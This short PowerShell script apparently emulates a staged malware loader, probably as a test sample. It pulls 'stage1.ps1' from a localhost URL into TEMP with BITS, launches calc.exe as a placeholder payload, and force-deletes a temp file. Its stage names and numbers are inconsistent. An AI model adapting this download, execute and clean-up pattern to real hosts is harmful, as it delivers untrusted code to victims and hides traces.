
<# Staged execution #>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'http://localhost:8081/stage1.ps1',
    [string]$WorkingPath = "$env:TEMP\stage1.bin",
    [int]$TransferTimeout = 26
)
Start-BitsTransfer -Source $DownloadUrl -Destination $WorkingPath
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Write-Output "stage 11 initialized"
